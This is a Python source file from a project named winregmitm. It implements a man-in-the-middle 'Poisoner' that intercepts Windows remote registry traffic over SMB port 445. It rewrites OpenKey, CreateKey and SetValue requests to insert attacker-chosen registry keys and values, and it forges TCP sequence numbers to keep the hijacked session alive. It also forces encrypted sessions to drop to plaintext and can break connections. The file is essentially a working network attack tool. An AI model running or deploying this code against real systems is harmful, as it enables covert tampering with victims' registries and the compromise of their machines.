# File from winregmitm project
# Copyright (C) Santiago Hernandez Ramos <shramos@protonmail.com>
# For more information about the project: https://github.com/shramos/winregmitm

from scapy.layers.inet import TCP, IP, Raw
from netfilterqueue import NetfilterQueue
from winreg_pkts import WinregPkt, GetVersion, CreateKey, \
    SetValue, OpenKey
from termcolor import colored
import binascii


class Poisoner(object):

    _KEY_NAME = 188
    _CK_NAME = 188
    _FAULT_DCE_LAYER = '\x05\x00\x03\x03\x10\x00\x00\x00 \x00\x00\x00\x04\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00'

    def __init__(self):
        # user inserted strings
        self._userkey = None
        self._uservalue = None
        self._usernewkey = None
        self._lasthandle = None
        self._verbosity = None
        self._newkeypath = None
        self._encrypted = False
        self._breakcon = False
        # attributes for tcp session simulation
        self._sseq = None
        self._sack = None
        self._snextseq = None
        self._dseq = None
        self._dack = None
        self._dnextseq = None
        self._insert = False
        # other
        self._newpath = False
        self._keycreated = False
        # other attributes for encrypted sessions
        self._count = 0
        self._modify_pkts = 0

    def _modify(self, packet):

        pkt = IP(packet.get_payload())  # Scapy compatible String

        # This will break the connection between the client and the server
        if self._breakcon:
            if not(self._isbroken(pkt)):
                packet.drop()
            else:
                print colored("[*] Session broken", 'red', attrs=['bold'])
                self._breakcon = False
            return

        # This case will handle encrypted sessions
        if self._encrypted:
            if self._modify_pkts == 2:
                self._encrypted = False
                print colored("[*] Session forzed to go unencrypted", 'red',
                              attrs=['bold'])
                return
            else:
                pkt = self._encrypted_session(pkt)
            # Accepting the packet
            self._accept(packet, str(pkt))
            return

        # This data will be usefull in case of a tcp session simulation
        if pkt[TCP].sport == 445:
            self._sseq = pkt[TCP].seq
            self._sack = pkt[TCP].ack
            self._snextseq = self._nextseqcalc(pkt)

        elif pkt[TCP].dport == 445:
            self._dseq = pkt[TCP].seq
            self._dack = pkt[TCP].ack
            self._dnextseq = self._nextseqcalc(pkt)

        # TCP session simulation is required
        if self._insert:
            if pkt[TCP].sport == 445:
                pkt[TCP].seq = self._dack
                pkt[TCP].ack = self._dnextseq
                pkt = self._recalculate(pkt)
                # Pretty print
                if self._verbosity == 1:
                    self._prettyprint_tcp(pkt[TCP].sport,
                                          pkt[TCP].dport,
                                          pkt[TCP].seq,
                                          pkt[TCP].ack,
                                          self._dnextseq)

            elif pkt[TCP].dport == 445:
                pkt[TCP].seq = self._sack
                pkt[TCP].ack = self._snextseq
                pkt = self._recalculate(pkt)
                # Pretty print
                if self._verbosity == 1:
                    self._prettyprint_tcp(pkt[TCP].sport,
                                          pkt[TCP].dport,
                                          pkt[TCP].seq,
                                          pkt[TCP].ack,
                                          self._snextseq)

        winregpkt = WinregPkt(pkt)

        if winregpkt.payload is not None and winregpkt.opnum is not None:

            # Open Key packet
            if winregpkt.opnum == 15:
                if self._verbosity == 1:
                    print "\n### New OpenKey packet arrive! ###"
                custom_pkt = self._openkey(pkt)
                if self._userkey is not None:
                    self._accept(packet, str(custom_pkt))
                    # If last packet was an open key for creating a new key and the
                    # attacker has modified the path or the name
                    if self._newpath is True or self._keycreated is True:
                        self._keycreated = False
                        self._newpath = False
                        self._userkey = None
                    return

            # Create Key packet
            elif winregpkt.opnum == 6:
                if self._verbosity == 1:
                    print "\n### New CreateKey packet arrive! ###"
                custom_pkt = self._createkey(pkt)
                if self._usernewkey is not None:
                    self._accept(packet, str(custom_pkt))
                    return

            # Set Value packet
            elif winregpkt.opnum == 22:
                if self._verbosity == 1:
                    print "\n### New SetValue package arrive! ###"
                custom_pkt = self._setvalue(pkt)
                if self._uservalue is not None:
                    if self._verbosity is not None and self._verbosity == 1:
                        custom_pkt.show()
                    self._accept(packet, str(custom_pkt))
                    return

            # Get Version packet
            elif winregpkt.opnum == 26:
                self._getversion(pkt)

        self._accept(packet, str(pkt))

    def poison(self):
        nfqueue = NetfilterQueue()
        # The iptables rule queue number is 1, modify is the callback function
        nfqueue.bind(1, self._modify)

        try:
            print "[*] Waiting for packets..."
            nfqueue.run()
        except KeyboardInterrupt:
            pass

    def _openkey(self, pkt):

        ok = OpenKey(pkt)

        print "[*] New register key opened: %s" % str(ok.key_name)

        # Checking if the openkey package is for creating a new key
        if self._newkeypath is not None:
            print "[*] Creating a new key in: %s..." % str(ok.key_name)
            if ok.get_access_mask() == 4:
                self._newpath = True
                self._userkey = self._newkeypath
            # If the open key pkt is the next one to the new create key inserted
            # we need to craft the key path
            if self._keycreated is True:
                self._userkey = list(
                    "".join(self._newkeypath) + "\\" + "".join(self._usernewkey))
        elif self._keycreated is True:
            nkey = str(ok.key_name).split("\\")
            nkey[-1] = "".join(self._usernewkey)
            self._userkey = list("\\".join(nkey))

        # inserting key from attacker
        if self._userkey is not None:

            print "[*!] OPEN ATTACKER SUPPLIED KEY: %s" % "".join(self._userkey)

            diference = (len(self._userkey) + 1) - ok.actual_count

            if self._verbosity == 1:
                print 'The len of the user payload is: %s' % str(len(self._userkey))
                print 'The len of the original payload is: %s' % str(ok.actual_count)
                print 'The diference is: %s' % str(diference)

            # Calculating the offset for inserting the new key value
            if len(self._userkey) % 2 == 0:
                if ok.actual_count % 2 == 0:
                    offset = (diference + 1) * 2
                else:
                    offset = diference * 2
            else:
                if ok.actual_count % 2 == 0:
                    offset = diference * 2
                else:
                    offset = (diference - 1) * 2

            accessmask = ok.get_access_mask()

            # if the key the user want to insert is equal or less than the original
            if diference <= 0:

                ok.insert(self._userkey, self._KEY_NAME, ok.name_len)

                ok.name_len = ok.name_size = len(self._userkey) * 2 + 2
                ok.max_count = ok.actual_count = len(self._userkey) + 1

                if offset != 0:
                    ok.set_access_mask(accessmask, slice(-4 + offset, offset))
                elif offset == 0:
                    ok.set_access_mask(accessmask, slice(-4 + offset, None))

                pkt[Raw].load = ok.payload

                return self._recalculate(pkt)

            # if the key the user want to insert is bigger than the original
            elif diference > 0:

                # Since the packet is bigger than the original,
                # we need to recalculate the next seq number
                self._insert = True
                if self._verbosity is None:
                    print colored('[*!] Starting TCP session simulation...', 'red', attrs=['bold'])

                ok.netbios_length += offset
                ok.smb2_data_length += offset
                ok.dce_frag_length += offset

                ok.addZeros(offset)

                ok.name_len = ok.name_size = len(self._userkey) * 2 + 2
                ok.max_count = ok.actual_count = len(self._userkey) + 1

                ok.insert(self._userkey, self._KEY_NAME, ok.name_len)

                ok.set_access_mask(accessmask)

                pkt[IP].len += offset

                pkt[Raw].load = ok.payload

                return self._recalculate(pkt)

            else:
                return None

    def _createkey(self, pkt):

        ck = CreateKey(pkt)

        print "[*] New key created: %s" % str(ck.getname())

        if self._usernewkey is not None:

            # The next key that will be open must be in the new create key path
            self._keycreated = True

            diference = (len(self._usernewkey) + 1) - ck.actual_count

            if len(self._usernewkey) % 2 == 0:
                if ck.actual_count % 2 == 0:
                    offset = (diference + 1) * 2
                else:
                    offset = diference * 2
            else:
                if ck.actual_count % 2 == 0:
                    offset = diference * 2
                else:
                    offset = (diference - 1) * 2

            accessmask = ck.get_access_mask()

            # if the new name the user want to insert is equal or less than the original
            if diference <= 0:

                ck.name_len = ck.name_size = len(self._usernewkey) * 2 + 2

                ck.insert(self._usernewkey, self._CK_NAME, ck.actual_count * 2)

                ck.max_count = ck.actual_count = len(self._usernewkey) + 1

                ck.set_access_mask(
                    accessmask, slice(-12 + diference, -8 + diference))

                pkt[Raw].load = ck.payload

                return self._recalculate(pkt)

            # if the new name the user want to insert is bigger than the original
            elif diference > 0:

                # Since the packet is bigger than the original one,
                # we need to recalculate the next seq number
                self._insert = True
                if self._verbosity is None:
                    print colored('[*!] Starting TCP session simulation...', 'red', attrs=['bold'])

                ck.netbios_length += offset
                ck.smb2_data_length += offset
                ck.dce_frag_length += offset

                ck.addZeros(offset)

                ck.name_len = ck.name_size = (len(self._usernewkey) + 1) * 2
                ck.max_count = ck.actual_count = len(self._usernewkey) + 1

                ck.insert(self._usernewkey, self._CK_NAME,
                          ck.actual_count * 2 + 8)

                ck.set_access_mask(accessmask)

                pkt[IP].len += offset

                pkt[Raw].load = ck.payload

                return self._recalculate(pkt)

        else:
            return None

    def _setvalue(self, pkt):

        sv = SetValue(pkt)

        # inserting payload from attacker
        if self._uservalue is not None:

            # if the new value the user want to insert is equal or less than the original
            if sv.rrs_size / 2 >= len(self._uservalue) and sv.packet_type == 0:

                print colored("[*!] Inserting user payload into register key value...", 'red', attrs=['bold'])

                sv.insert(self._uservalue, 200, sv.rrs_size)

                pkt[Raw].load = sv.payload

                self._userkey = None

                return self._recalculate(pkt)

            # if the new value the user want to insert is equal or less than the original
            elif sv.packet_type == 0:

                print colored("[*!] Inserting user payload into register key value...", 'red', attrs=['bold'])

                # Since the packet is bigger than the original one,
                # we need to recalculate the next seq number
                self._insert = True
                if self._verbosity is None:
                    print colored('[*!] Starting TCP session simulation...', 'red', attrs=['bold'])

                if len(self._uservalue) % 2 == 0:
                    offset = len(self._uservalue) * 2
                else:
                    offset = (len(self._uservalue) - 1) * 2

                rrs_size = sv.rrs_size

                sv.addZeros(offset)

                sv.rrs_size = rrs_size + offset
                sv.smb2_data_length += offset
                sv.rrs_max_count += offset
                sv.dce_frag_length += offset
                sv.netbios_length += offset

                sv.insert(self._uservalue, 200, sv.rrs_max_count)

                pkt[Raw].load = sv.payload
                pkt[IP].len += offset

                self._userkey = None

                return self._recalculate(pkt)

            else:
                return None

        else:
            return None

    def _getversion(self, pkt):
        gv = GetVersion(pkt)
        if self._lasthandle is None or self._lasthandle != gv.handle:
            if self._verbosity is not None:
                print "                    |-> (handle: %s)" % gv.prettyprint(gv.handle)
            self._lasthandle = gv.handle

    def _encrypted_session(self, pkt):
        opnum = 0
        if pkt.haslayer("Raw"):
            # Trying to extracting the opnum, so we can know the type of packet
            try:
                opnum = int(self._reverse(
                    binascii.hexlify(pkt[Raw].load[173])), 16)
            except:
                pass
        if opnum == 6 and self._count <= 1:
            self._count += 1
            pay = list(pkt[Raw].load)
            pay[116:] = list(self._FAULT_DCE_LAYER)
            pkt[Raw].load = "".join(pay)
            del pkt[IP].len
            pkt = self._recalculate(pkt)
            self._modify_pkts += 1
        return pkt

    def _isbroken(self, pkt):
        pkt_type = 0
        if pkt.haslayer("Raw"):
            try:
                pkt_type = int(self._reverse(
                    binascii.hexlify(pkt[Raw].load[68])), 16)
            except:
                pass
        if pkt_type == 4:
            return True
        else:
            return False

    def _reverse(self, b):
        return "".join(reversed([b[i:i + 2] for i in range(0, len(b), 2)]))

    def _recalculate(self, pkt):
        del pkt[IP].chksum
        del pkt[TCP].chksum
        return pkt.__class__(str(pkt))

    def _accept(self, packet, custom_pkt):
        if custom_pkt is not None:
            packet.set_payload(custom_pkt)
            packet.accept()
        else:
            raise ValueError("Error modifying the packet, package is empty")

    def _nextseqcalc(self, pkt):
        return pkt[TCP].seq + pkt[IP].len - 40

    @property
    def key(self):
        return self._userkey

    @key.setter
    def key(self, value):
        self._userkey = list(value)

    @property
    def value(self):
        return self._uservalue

    @value.setter
    def value(self, value):
        self._uservalue = list(value)

    @property
    def newkey(self):
        return self._usernewkey

    @newkey.setter
    def newkey(self, value):
        self._usernewkey = list(value)

    @property
    def verbosity(self):
        return self._verbosity

    @verbosity.setter
    def verbosity(self, value):
        self._verbosity = value

    @property
    def newkeypath(self):
        return self._newkeypath

    @newkeypath.setter
    def newkeypath(self, value):
        self._newkeypath = value

    @property
    def encrypted(self):
        return self._encrypted

    @encrypted.setter
    def encrypted(self, value):
        self._encrypted = value

    @property
    def breakcon(self):
        return self._breakcon

    @breakcon.setter
    def breakcon(self, value):
        self._breakcon = value

    def _prettyprint_tcp(self, sport, dport, seq, ack, nextseq):
        print "[**]"
        print "+---------------------+"
        print "|        TCP          |"
        print "+---------------------+"
        print "==> sport: %s" % str(sport)
        print "==> dport: %s" % str(dport)
        print "+---------------------+"
        print "==> seq: %s" % str(seq)
        print "==> ack: %s" % str(ack)
        print "[ next seq: %s]" % str(nextseq)
        if sport == 445:
            print "================ TO =================>>> CLIENT"
        elif dport == 445:
            print "================ TO =================>>> SERVER"
        print "[**]"
        print ""

    def prettyprint(self, value):
        """ pretty printing of the handle
        """
        if value is not None:
            return "".join("{:02x}".format(ord(c)) for c in value)
        return None
